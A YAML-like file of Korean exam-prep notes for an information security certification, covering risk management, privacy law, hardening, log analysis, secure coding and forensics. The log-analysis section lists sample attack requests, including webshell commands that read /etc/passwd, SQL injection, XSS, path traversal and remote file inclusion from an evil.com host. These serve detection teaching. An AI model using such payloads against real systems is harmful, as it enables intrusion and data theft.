        - "'감염이 의심될 때 확인할 것'을 순서로 쓰면 점수가 됩니다. ① 비정상 프로세스(ps, lsof) ② 비정상 네트워크 연결(netstat -antp) ③ 자동 실행 등록(cron, rc.local, 레지스트리 Run) ④ 최근 변경 파일(find -mtime) ⑤ 로그(secure, messages) ⑥ 계정 추가 여부(/etc/passwd 변경)."

  eis-13:
    - h: "계산 문제는 식만 외우면 된다"
      code: |
        SLE(1회 손실액)  = 자산 가치 × 노출 계수(EF)
        ALE(연간 손실액) = SLE × 연간 발생률(ARO)
        대책의 가치      = 대책 전 ALE - 대책 후 ALE - 대책의 연간 비용   (양수면 도입할 만함)

        예) 자산 2억, EF 25%, ARO 0.2  →  SLE 5,000만 원, ALE 1,000만 원
    - h: "위험 관리 절차와 처리 전략"
      code: |
        절차: 위험 관리 전략 수립 → 위험 분석(자산·위협·취약점 식별, 위험도 산정)
              → 위험 평가(수용 가능한 위험 수준 DoA 와 비교) → 위험 처리 → 모니터링

        처리 전략 4가지
          수용(Accept)   위험이 작아 그대로 받아들임
          감소(Mitigate) 보호대책을 적용해 위험을 낮춤
          회피(Avoid)    위험이 큰 업무·자산 자체를 없앰
          전가(Transfer) 보험 가입, 외주 등으로 책임을 넘김
      p:
        - "'잔여 위험'은 대책을 적용한 뒤에도 남는 위험입니다. 잔여 위험이 수용 가능한 수준(DoA) 이하가 되도록 관리하고, 경영진이 승인한다는 점을 함께 씁니다."
        - "위험 분석 방법론도 묻습니다. 정량적(과거 자료, 수학 공식, 확률 분포 — 금액으로 산출)과 정성적(델파이, 시나리오, 순위 결정 — 등급으로 표현), 베이스라인 접근법(표준 체크리스트), 복합 접근법."
    - h: "업무 연속성(BCP·DRP)"
      code: |
        RTO  복구 목표 시간 — 언제까지 복구할 것인가
        RPO  복구 목표 시점 — 어느 시점 데이터까지 살릴 것인가(백업 주기와 직결)
        MTD  최대 허용 중단 시간
        BIA  업무 영향 분석 — 핵심 업무와 RTO·RPO 를 정하는 단계

        복구 센터
          Mirror  실시간 이중화, 즉시(수 분)         가장 비쌈
          Hot     수 시간 내 복구, 설비·데이터 준비
          Warm    수 일, 일부 설비만
          Cold    수 주, 공간만 확보                 가장 저렴
      p:
        - "'RPO 가 1시간이면 백업을 어떻게 해야 하는가'는 '최소 1시간 간격으로 백업하거나 실시간 복제를 적용한다'가 답입니다. RPO 는 백업 주기, RTO 는 복구 체계와 연결해 설명하세요."

  eis-14:
    - h: "ISMS-P 는 숫자와 구조"
      p:
        - "'16 + 64 + 21 = 101'과 3개 영역 이름, 유효 기간 3년·매년 사후 심사를 먼저 외웁니다. 관리체계 수립 및 운영 16개는 다시 '기반 마련 → 위험 관리 → 운영 → 점검 및 개선' 4단계(PDCA)로 나뉩니다."
      code: |
        1. 관리체계 수립 및 운영        16개
        2. 보호대책 요구사항            64개
        3. 개인정보 처리 단계별 요구사항 21개
        ─────────────────────────────────
        ISMS 인증      1 + 2 = 80개
        ISMS-P 인증    1 + 2 + 3 = 101개

        유효기간 3년, 매년 사후 심사, 3년마다 갱신 심사
    - h: "의무 대상과 운영 기관"
      p:
        - "ISMS 의무 대상은 ① 전기통신사업자 중 서울·광역시에서 정보통신망서비스를 제공하는 자 ② IDC 사업자 ③ 연간 매출·세입 1,500억 원 이상인 상급종합병원과 재학생 1만 명 이상 대학 ④ 정보통신서비스 부문 전년도 매출 100억 원 이상 또는 일평균 이용자 100만 명 이상인 자입니다. 숫자가 자주 바뀌므로 시험 전에 최신 고시를 확인하세요."
        - "인증기관은 KISA 와 금융보안원 등이고 정책기관은 과학기술정보통신부·개인정보보호위원회입니다."
    - h: "관리체계 4단계(PDCA)"
      code: |
        1.1 관리체계 기반 마련   경영진 참여, 최고책임자 지정, 조직 구성, 범위 설정, 자원 할당
        1.2 위험 관리            정보자산 식별, 현황·흐름 분석, 위험 평가, 보호대책 선정
        1.3 관리체계 운영        보호대책 구현, 공유, 운영현황 관리
        1.4 관리체계 점검 및 개선 법적 요구사항 준수 검토, 관리체계 점검, 개선

  eis-15:
    - h: "법규는 '숫자'와 '목록'을 그대로"
      p:
        - "법규 문제는 조문의 낱말을 빈칸으로 냅니다. 72시간(유출 통지), 1년·2년(접속 기록 보관), 월 1회(접속 기록 점검), 동의 시 고지 4항목, 고유식별정보 4종처럼 숫자와 목록을 정확히 외워야 점수가 됩니다."
        - "법령과 고시는 자주 개정됩니다. 시험 한 달 전에 국가법령정보센터에서 개인정보 보호법, 개인정보의 안전성 확보조치 기준의 최신 조문을 확인하세요."
    - h: "숫자만 모은 표"
      code: |
        유출 통지        지체 없이, 72시간 이내 (정보주체 통지 + 전문기관 신고)
        접속 기록 보관   1년 이상 (5만 명 이상 개인정보·고유식별정보·민감정보는 2년 이상)
        접속 기록 점검   월 1회 이상
        비밀번호 등      일방향 암호화 저장
        암호화 대상      고유식별정보, 비밀번호, 바이오정보
        파기             보유기간 경과·목적 달성 시 지체 없이(5일 이내)
        영향평가         공공기관 일정 규모 이상 시 의무
      p:
        - "'72시간'은 유출을 인지한 때부터입니다. 통지 항목은 유출된 항목, 시점과 경위, 피해 최소화를 위해 정보주체가 할 수 있는 방법, 대응 조치와 피해 구제 절차, 신고 접수 부서와 연락처입니다."
    - h: "동의와 정보 분류"
      code: |
        동의 시 고지 4항목
          ① 수집·이용 목적 ② 수집 항목 ③ 보유·이용 기간
          ④ 동의 거부 권리와 거부 시 불이익

        고유식별정보 4종: 주민등록번호, 여권번호, 운전면허번호, 외국인등록번호
        민감정보: 사상·신념, 노동조합·정당 가입, 정치적 견해, 건강, 성생활,
                  유전정보, 범죄경력, 생체인식정보 등
      p:
        - "주민등록번호는 다른 고유식별정보와 달리 '별도 동의를 받아도' 원칙적으로 처리할 수 없고, 법령에 구체적 근거가 있을 때만 가능합니다. 이 차이가 자주 출제됩니다."
        - "가명정보는 추가 정보 없이는 특정 개인을 알아볼 수 없게 한 것으로 통계작성·과학적 연구·공익적 기록보존 목적에 동의 없이 쓸 수 있고, 익명정보는 복원이 불가능해 개인정보가 아닙니다."

  eis-16:
    - h: "2027 출제기준에 새로 들어온 범위"
      p:
        - "클라우드는 '누가 무엇을 책임지나(책임 공유 모델)'와 '네트워크를 어떻게 막나(Security Group 과 Network ACL)'가 핵심입니다. Security Group 은 서버에 붙는 상태 저장 방화벽, Network ACL 은 서브넷 경계의 상태 비저장 방화벽이라고 대비해 씁니다."
        - "API 보안은 '인증은 됐지만 인가를 빠뜨린' 문제가 1순위입니다. 로그인한 사용자가 URL 의 번호만 바꿔 남의 데이터를 보는 것이 BOLA 입니다."
    - h: "책임 공유 모델"
      code: |
        구분             IaaS        PaaS        SaaS
        데이터·계정      고객        고객        고객
        애플리케이션     고객        고객        제공자
        런타임·미들웨어  고객        제공자      제공자
        OS              고객        제공자      제공자
        가상화·물리      제공자      제공자      제공자

        어느 모델이든 '데이터와 접근 권한'은 항상 고객 책임
      p:
        - "클라우드 사고의 대부분은 설정 오류입니다. 스토리지 버킷 전체 공개, 과도한 IAM 권한, 보안 그룹 0.0.0.0/0 개방, 키 하드코딩이 4대 유형입니다. 대응은 최소 권한, 기본 차단, 키 대신 역할(Role) 사용, 설정 점검 자동화(CSPM)입니다."
    - h: "컨테이너와 가상화 보안"
      code: |
        이미지    신뢰할 수 있는 베이스, 취약점 스캔, 서명 검증, 비밀값 포함 금지
        런타임    root 로 실행하지 않기, 권한 상승 금지, 읽기 전용 파일시스템
        오케스트레이션  네임스페이스 분리, RBAC, 네트워크 정책, Secret 관리
        호스트    커널 공유 구조이므로 호스트 침해 시 전체 컨테이너 영향
      p:
        - "가상머신은 하이퍼바이저가 OS 를 분리하고, 컨테이너는 커널을 공유하며 네임스페이스·cgroup 으로 분리합니다. 그래서 격리 수준은 VM 이 높고, 자원 효율은 컨테이너가 높습니다."

  eis-17:
    - h: "장비 설정 문제 읽는 법"
      p:
        - "라우터 ACL 은 위에서 아래로 처음 맞는 줄이 적용되고, 어느 줄에도 맞지 않으면 차단됩니다(암묵적 deny). 그래서 'deny 몇 줄 + permit ip any any' 형태가 많고, 문제는 '이 ACL 로 차단되는 서비스는?'을 묻습니다. eq 뒤의 포트 번호를 서비스 이름으로 바꿔 답하면 됩니다."
      code: |
        access-list 101 deny tcp any any eq 20      → FTP 데이터
        access-list 101 deny tcp any any eq 21      → FTP 제어
        access-list 101 deny tcp any any eq 23      → Telnet
        access-list 101 permit ip any any           → 나머지 허용
    - h: "외워야 하는 포트 번호"
      code: |
        20/21 FTP     22 SSH/SFTP   23 Telnet    25 SMTP    53 DNS
        67/68 DHCP    69 TFTP       80 HTTP      110 POP3   123 NTP
        143 IMAP      161/162 SNMP  389 LDAP     443 HTTPS  445 SMB
        465 SMTPS     514 syslog    587 SMTP 제출 993 IMAPS 995 POP3S
        1433 MSSQL    1521 Oracle   3306 MySQL   3389 RDP   5432 PostgreSQL
      p:
        - "평문 프로토콜과 암호화 대체재를 짝으로 외우면 '어떻게 개선하는가' 문제에 바로 답합니다. Telnet→SSH, FTP→SFTP/FTPS, HTTP→HTTPS, SNMPv1·v2→SNMPv3, POP3/IMAP→POP3S/IMAPS."
    - h: "VLAN·NAT·SNMP"
      code: |
        VLAN    스위치에서 논리적으로 망을 분리. 트렁크는 802.1Q 태그로 여러 VLAN 전달
                공격: VLAN 호핑(스위치 스푸핑, 이중 태깅) → 미사용 포트 shutdown,
                      트렁크 자동 협상(DTP) 비활성화, 네이티브 VLAN 을 미사용 VLAN 으로
        NAT     사설 IP ↔ 공인 IP 변환. Static(1:1) Dynamic(풀) PAT(포트까지, 다대일)
                부수 효과로 내부 주소를 숨기는 보안 효과
        SNMP    v1·v2c 는 커뮤니티 스트링이 평문(public/private 기본값이 취약점)
                v3 는 사용자 기반 인증과 암호화 지원 → v3 사용, 커뮤니티 변경, 접근 ACL
      p:
        - "'SNMP 기본 커뮤니티 스트링의 문제와 대응'은 거의 매년 변형돼 나옵니다. public/private 를 추측 가능한 값으로 두면 장비 정보를 읽고 설정까지 바꿀 수 있으므로, 복잡한 값으로 변경하고 접근 가능한 IP 를 제한하며 가능하면 v3 로 전환합니다."

  eis-18:
    - h: "최신 암호 기술은 '왜 필요한가'부터"
      p:
        - "양자 컴퓨터가 실용화되면 지금의 공개키 암호(RSA, ECC)가 깨집니다. 그래서 양자 컴퓨터로도 풀기 어려운 문제에 기반한 양자내성암호로 바꾸는 중입니다. 동형암호는 '암호를 풀지 않고 계산', 경량암호는 '작은 기기에서도 돌아가는 암호'로 한 줄씩 정의할 수 있으면 됩니다."
      code: |
        쇼어 알고리즘   소인수분해·이산대수를 빠르게 품 → RSA·ECC 무력화
        그로버 알고리즘 탐색 속도를 제곱근으로 단축 → 대칭키는 키 길이를 2배로 하면 대응 가능
        → 그래서 AES-256 은 당분간 안전, RSA·ECC 는 교체 대상
    - h: "DB 보안"
      code: |
        접근 통제   최소 권한(필요한 테이블·컬럼만), 불필요 계정·기본 계정 제거,
                    DB 포트 외부 노출 금지, 접속 가능 IP 제한
        암호화      저장 시 TDE(투명 데이터 암호화) 또는 컬럼 암호화, 전송 시 TLS
        감사        접속·질의 로그 기록과 정기 점검, DB 접근 제어 솔루션
        비식별화    가명·익명 처리, 마스킹, 총계 처리, 범주화, 데이터 삭제
      p:
        - "비식별 조치 5가지를 묻는 문제가 있습니다. 가명처리, 총계처리, 데이터 삭제, 범주화, 데이터 마스킹입니다."

  eis-19:
    - h: "2026년 1·2회 복원 문제에서 반복된 유형"
      p:
        - "단답형 12문제 중 절반 가까이가 '설정 파일 이름, 옵션 이름, 명령어'를 그대로 쓰는 문제였습니다. 개념을 알아도 named.conf, resolv.conf, access.db, chmod -s 같은 정확한 표기를 쓰지 못하면 0점입니다. 이 단원은 눈으로 읽지 말고 손으로 써 보세요."
    - h: "서비스별 한 장 정리"
      code: |
        DNS       /etc/named.conf   /etc/resolv.conf   allow-transfer   recursion no
        메일      /etc/mail/sendmail.cf   /etc/mail/access → makemap hash → access.db
        r 계열    /etc/hosts.equiv   ~/.rhosts   소유자 root·권한 600·'+' 제거
        웹        httpd.conf   Options -Indexes   ServerTokens Prod   ServerSignature Off
        FTP       /etc/ftpusers(접속 금지 계정)   anonymous_enable=NO
        SSH       /etc/ssh/sshd_config   PermitRootLogin no
        계정      /etc/passwd(x)   /etc/shadow   /etc/login.defs
    - h: "접근 제어 파일과 서비스 관리"
      code: |
        /etc/hosts.allow   sshd : 10.1.1.0/255.255.255.0     허용
        /etc/hosts.deny    ALL : ALL                          나머지 차단
        (allow 를 먼저 보고, 없으면 deny 를 본다. TCP Wrapper)

        /etc/xinetd.d/*    disable = yes 로 불필요한 서비스 중지
        systemctl list-unit-files --type=service | grep enabled   자동 시작 서비스 확인
        systemctl disable --now telnet.socket                     중지와 비활성화
      p:
        - "'불필요한 서비스를 중지하는 이유'는 '공격 표면을 줄이기 위해서'입니다. 열려 있는 포트 하나하나가 취약점이 될 수 있다는 문장을 답안에 넣으세요."
    - h: "웹 서버 보안 설정"
      code: |
        Options -Indexes            디렉터리 목록 노출 금지
        ServerTokens Prod           응답 헤더에 버전 숨김
        ServerSignature Off         에러 페이지의 서버 정보 숨김
        TraceEnable Off             TRACE 메서드 비활성(XST 방지)
        LimitExcept GET POST        불필요한 HTTP 메서드 차단(PUT, DELETE)
        <Directory /upload> php_flag engine off </Directory>   업로드 폴더 실행 금지

  eis-20:
    - h: "Windows 는 '메뉴 이름과 경로'를 묻는다"
      p:
        - "유닉스가 파일과 명령을 묻는다면 Windows 는 관리 도구의 항목 이름(감사 정책 9종), 로그 폴더 이름(HTTPERR, dhcp), 이벤트 ID 를 묻습니다. 감사 정책은 9개를 다 외우기 어렵다면 '계정 관리, 계정 로그온 이벤트, 로그온 이벤트, 권한 사용, 개체 액세스' 5개부터 외우세요."
        - "'계정 로그온 이벤트'는 계정을 검증한 컴퓨터(도메인 컨트롤러)에 남고, '로그온 이벤트'는 실제로 로그온한 컴퓨터에 남는다는 차이도 자주 나옵니다."
    - h: "관리 도구와 명령"
      code: |
        gpedit.msc     로컬 그룹 정책(암호 정책, 계정 잠금, 감사 정책)
        secpol.msc     로컬 보안 정책      eventvwr.msc  이벤트 뷰어
        services.msc   서비스             compmgmt.msc   컴퓨터 관리
        lusrmgr.msc    로컬 사용자/그룹    regedit        레지스트리

        net user                 계정 목록      net localgroup administrators  관리자 그룹
        netstat -ano             포트와 PID     tasklist /svc                  프로세스
        wmic startup list full   자동 실행 항목
      p:
        - "자동 실행 레지스트리 경로도 외워 두면 좋습니다. HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run 과 같은 경로의 HKCU 버전입니다. 악성코드 지속성 확보의 전형적인 위치입니다."
    - h: "주요 이벤트 ID"
      code: |
        4624  로그온 성공        4625  로그온 실패
        4634  로그오프           4647  사용자 주도 로그오프
        4720  계정 생성          4726  계정 삭제
        4728  보안 그룹에 구성원 추가
        4672  특수 권한 할당(관리자 로그온)
        1102  감사 로그가 지워짐  ← 침해 흔적 은폐의 강력한 신호
      p:
        - "로그온 유형도 함께 나옵니다. 2는 대화식(콘솔), 3은 네트워크(공유 접근), 10은 원격 데스크톱(RDP)입니다. '4625 가 유형 10 으로 대량 발생'이면 RDP 무차별 대입 공격입니다."
    - h: "UAC 와 보안 설정"
      p:
        - "UAC 는 관리자 계정이라도 평소에는 표준 사용자 권한으로 실행하고, 권한이 필요한 순간에만 동의를 받아 상승시키는 기능입니다. 끄면 악성코드가 묻지 않고 권한을 얻으므로 끄지 않는 것이 원칙입니다."
        - "점검 항목으로 자주 나오는 것: Administrator 이름 변경, Guest 계정 비활성화, 암호 복잡성 사용, 계정 잠금 임계값 설정, 마지막 사용자 이름 표시 안 함, 익명 SID 열거 제한, 공유 폴더 권한 점검."

  eis-21:
    - h: "실무형(로그·트래픽 분석) 푸는 순서"
      p:
        - "① 누가(출발지 IP) ② 무엇을(URL, 매개변수) ③ 결과는(상태 코드 200 이면 성공, 404·403 이면 실패) 순서로 읽습니다. 그다음 '어떤 공격인가 → 근거가 되는 로그 줄 → 대응 방안 2~3개'를 씁니다."
      code: |
        10.1.1.5 - - [12/Mar/2026:10:21:07] "POST /board/upload.php HTTP/1.1" 200 512      ← 파일 업로드
        10.1.1.5 - - [12/Mar/2026:10:21:30] "GET /upload/sh.php?cmd=id HTTP/1.1" 200 48    ← 올린 파일로 명령 실행(웹셸)
        10.1.1.5 - - [12/Mar/2026:10:22:02] "GET /upload/sh.php?cmd=cat+/etc/passwd HTTP/1.1" 200 1840
        → 웹셸 업로드 공격. 대응: 확장자 화이트리스트, 업로드 폴더 실행 권한 제거, 웹 루트 밖 저장
    - h: "로그에서 공격 알아보기"
      code: |
        GET /index.php?id=1' OR '1'='1              SQL 삽입 시도
        GET /search?q=<script>alert(1)</script>     XSS 시도
        GET /../../../../etc/passwd                 경로 조작(디렉터리 트래버설)
        GET /admin.php  401 반복                     무차별 대입
        GET /?page=http://evil.com/sh.txt           원격 파일 포함(RFI)
        POST /login 다수 + 200 하나                   크리덴셜 스터핑 성공 의심

        상태 코드: 200 성공  301/302 이동  401 인증 필요  403 금지
                   404 없음  500 서버 오류
      p:
        - "'공격이 성공했는지 판단하는 근거'를 묻는 문제가 있습니다. 같은 요청이 403·404 만 반복되면 실패, 200 과 함께 응답 크기가 커졌다면 성공으로 봅니다."
    - h: "점검 도구"
      code: |
        nmap        포트·서비스 스캔         nikto    웹 서버 취약점 점검
        OpenVAS     종합 취약점 스캐너       sqlmap   SQL 삽입 자동 점검
        Wireshark   패킷 분석               tcpdump  CLI 패킷 캡처
        John/Hashcat 비밀번호 크래킹(점검)   Burp     웹 프록시·요청 조작
        AIDE/Tripwire 파일 무결성 검사       chkrootkit/rkhunter 루트킷 점검
      p:
        - "점검 도구는 반드시 사전 서면 승인을 받고 범위를 합의한 뒤 사용해야 한다는 점을 답안에 한 줄 넣으면 좋습니다."

  eis-22:
    - h: "목록형 서술은 개수를 채워야 점수"
      p:
        - "'CISO 의 역할 4가지', '생체인식정보 보호 원칙 6가지'처럼 개수를 정해 묻는 서술형은 항목 수만큼 부분 점수가 나옵니다. 문장으로 길게 쓰기보다 번호를 붙여 항목을 모두 적는 것이 유리합니다."
        - "CISO 4가지는 '계획 → 감사 → 위험 → 교육'의 첫 낱말로, 생체인식정보 6원칙은 '비·적·목·투·안·통'으로 외우면 빠뜨리지 않습니다."
    - h: "CISO 와 CPO"
      code: |
        CISO(정보보호 최고책임자)  정보통신망법 근거. 일정 규모 이상 지정·신고 의무
          역할: 정보보호 계획 수립·시행, 정보보호 실태와 관행의 정기 감사·개선,
                정보보호 위험 식별·평가 및 정보보호 대책 마련,
                정보보호 교육과 모의 훈련 계획 수립·시행

        CPO(개인정보 보호책임자)  개인정보 보호법 근거
          역할: 개인정보 처리 관련 계획 수립·시행, 처리 실태 조사 및 개선,
                불만 처리와 피해 구제, 유출·오용 방지 내부통제 구축,
                보호교육 계획 수립·시행, 개인정보파일 관리·감독
      p:
        - "CISO 와 CPO 를 겸직할 수 있는지, 분리해야 하는지도 규모에 따라 달라집니다. 일정 규모 이상의 기업은 CISO 의 겸직이 제한됩니다."

  eis-23:
    - h: "개발 단계에서 막는다는 관점"
      p:
        - "이 단원은 공격자 관점이 아니라 개발자 관점입니다. '어떻게 공격하나'가 아니라 '코드를 어떻게 써야 그 공격이 안 통하나'를 씁니다. 그래서 답안에 반드시 구체적인 함수나 설정 이름이 들어가야 합니다."
        - "7대 유형 이름을 외우는 것이 먼저입니다. 입력 데이터 검증 및 표현, 보안 기능, 시간 및 상태, 에러 처리, 코드 오류, 캡슐화, API 오용. 앞 글자로 '입·보·시·에·코·캡·API' 로 묶으면 빠뜨리지 않습니다."
    - h: "안전한 코드로 바꾸기"
      code: |
        ── SQL 삽입 ──────────────────────────────────
        취약: "SELECT * FROM users WHERE id = '" + id + "'"
        안전: PreparedStatement ps = conn.prepareStatement(
                  "SELECT * FROM users WHERE id = ?");
              ps.setString(1, id);

        ── 운영체제 명령어 삽입 ───────────────────────
        취약: Runtime.getRuntime().exec("ping " + host);
        안전: 외부 명령 사용을 피하고, 불가피하면 허용 목록으로 검증
              (세미콜론·파이프·백틱 등 메타문자 차단)

        ── 경로 조작 ─────────────────────────────────
        취약: new File("/data/" + request.getParameter("f"));
        안전: 파일명에서 경로 문자 제거 후 getCanonicalPath() 로
              기준 디렉터리 하위인지 확인

        ── 하드코드된 비밀번호 ────────────────────────
        취약: String pw = "P@ssw0rd";
        안전: 설정 파일·비밀 관리 시스템에서 읽고, 저장 시 암호화
      p:
        - "'취약한 코드를 보여 주고 고치시오' 형태가 늘고 있습니다. 고친 코드를 쓸 때 '왜 안전해졌는지'를 한 줄 덧붙이면 서술 점수까지 챙길 수 있습니다."
    - h: "출력 인코딩은 위치마다 다르다"
      code: |
        위치                      인코딩
        HTML 본문                 < → &lt;   > → &gt;   & → &amp;
        HTML 속성값               속성을 따옴표로 감싸고 " → &quot;  ' → &#39;
        자바스크립트 문자열 안     \\x3c 같은 유니코드 이스케이프
        URL 매개변수              퍼센트 인코딩(%3C)
      p:
        - "'입력 검증만으로 XSS 를 막을 수 없는 이유'는 '같은 값이라도 출력되는 위치에 따라 위험한 문자가 다르기 때문'입니다. 그래서 출력 시점의 컨텍스트별 인코딩이 함께 필요합니다."

  eis-24:
    - h: "포렌식은 '순서'가 점수다"
      p:
        - "이 단원은 기술보다 절차를 묻습니다. 5원칙과 수집 순서, 연계 보관성 이 셋만 정확히 쓰면 대부분의 문제가 풀립니다."
        - "휘발성 순서는 '사라지기 쉬운 것부터'로 이해하면 외우기 쉽습니다. 전원을 끄면 날아가는 것(레지스터, 메모리, 네트워크 연결)이 먼저이고, 디스크와 백업은 나중입니다."
      code: |
        수집 순서(RFC 3227)
        ① 레지스터·캐시 ② 메모리(RAM) ③ 네트워크 연결·ARP 캐시
        ④ 실행 중 프로세스 ⑤ 디스크 ⑥ 원격 로그·모니터링 자료
        ⑦ 물리적 구성·네트워크 토폴로지 ⑧ 보관 매체(백업)
    - h: "무결성 입증 절차"
      code: |
        ① 쓰기 방지 장치를 연결한다
        ② 원본의 해시값을 계산해 기록한다      sha256sum /dev/sdb > original.hash
        ③ 이미지(사본)를 뜬다                  dd if=/dev/sdb of=image.dd bs=4M
        ④ 사본의 해시값이 원본과 같은지 확인한다 sha256sum image.dd
        ⑤ 분석은 사본으로만 한다
        ⑥ 인수인계 기록(연계 보관성)을 남긴다
      p:
        - "'왜 해시를 쓰는가'의 답은 '내용이 한 비트라도 바뀌면 값이 완전히 달라지므로, 수집 시점과 제출 시점의 해시가 같다는 것으로 위변조가 없었음을 증명할 수 있기 때문'입니다."
    - h: "패킷으로 공격 읽기"
      code: |
        SYN 플러딩      다수 출발지 → SYN 다량, SYN+ACK 에 ACK 없음, SYN_RECEIVED 누적
        포트 스캔       한 출발지 → 여러 포트로 SYN, 닫힌 포트에서 RST 다량
        ARP 스푸핑      같은 IP 에 대해 서로 다른 MAC 의 ARP 응답이 반복
        DNS 증폭        작은 질의, 큰 응답, 출발지가 피해자 IP
        데이터 유출     비업무 시간대에 외부로 대용량 아웃바운드

        유용한 표시 필터
          tcp.flags.syn==1 and tcp.flags.ack==0     SYN 만
          http.request.method=="POST"               POST 요청
          ip.src==10.1.1.5 && tcp.port==80
          frame contains "passwd"                    평문에 포함된 문자열
      p:
        - "평문 프로토콜(Telnet, FTP, HTTP)은 Wireshark 의 'Follow TCP Stream' 으로 아이디와 비밀번호가 그대로 보입니다. '왜 암호화 프로토콜로 바꿔야 하는가'의 근거로 이 점을 적습니다."

  eis-25:
    - h: "법정 점검이라는 성격"
      p:
        - "이 단원은 '내가 점검자라면 어떻게 하겠는가'를 묻습니다. 그래서 답안 형식이 일정합니다. 점검 항목 → 현황 확인 방법(명령·경로) → 양호·취약 판단 기준 → 조치 방법. 이 네 칸을 채운다고 생각하면 됩니다."
        - "ISMS-P 와 헷갈리지 마세요. 기반시설 취약점 분석·평가는 정보통신기반 보호법에 따른 기술 점검 의무이고, ISMS-P 는 관리체계 인증입니다. 전자는 항목별 양호/취약 판정, 후자는 인증 획득이 목적입니다."
    - h: "답안 형식 예시"
      code: |
        [U-01] root 계정 원격 접속 제한                              중요도: 상

        현황 확인
          cat /etc/ssh/sshd_config | grep PermitRootLogin
          cat /etc/securetty | grep pts

        판단 기준
          양호: PermitRootLogin no 이고 /etc/securetty 에 pts 항목이 없음
          취약: root 로 원격 직접 접속이 가능함

        조치 방법
          sshd_config 에 PermitRootLogin no 설정 후 sshd 재시작
          /etc/securetty 의 pts 항목 제거
          일반 계정으로 접속 후 su 로 전환하도록 운영

        조치 시 영향
          기존에 root 로 직접 접속하던 스크립트·배치가 실패할 수 있으므로
          사전에 일반 계정과 sudo 권한을 준비한 뒤 적용한다
      p:
        - "'조치 시 영향'까지 쓰면 실무형 서술에서 차이가 납니다. 운영 중인 시스템에 적용할 때의 주의사항을 한 줄 덧붙이세요."
    - h: "자주 나오는 상(上) 등급 항목"
      code: |
        유닉스
          U-01 root 원격 접속 제한        U-02 비밀번호 복잡성
          U-03 계정 잠금 임계값           U-04 비밀번호 파일 보호(shadow)
          U-05 root 홈·경로 디렉터리 권한  U-06 파일·디렉터리 소유자 설정
          U-44 root 계정 su 제한          U-except SUID/SGID 점검

        윈도우
          W-01 Administrator 계정 이름 변경  W-02 Guest 계정 상태
          W-03 불필요한 계정 제거            W-10 해독 가능한 암호화로 암호 저장 금지

        네트워크 장비
          N-01 비밀번호 설정  N-02 비밀번호 복잡성  N-04 VTY 접근 제한
      p:
        - "항목 번호까지 외울 필요는 없지만, '유닉스 상 등급 항목을 3개 쓰시오' 정도는 나올 수 있으므로 U-01·U-02·U-04 처럼 대표적인 것은 번호와 함께 기억해 두면 좋습니다."
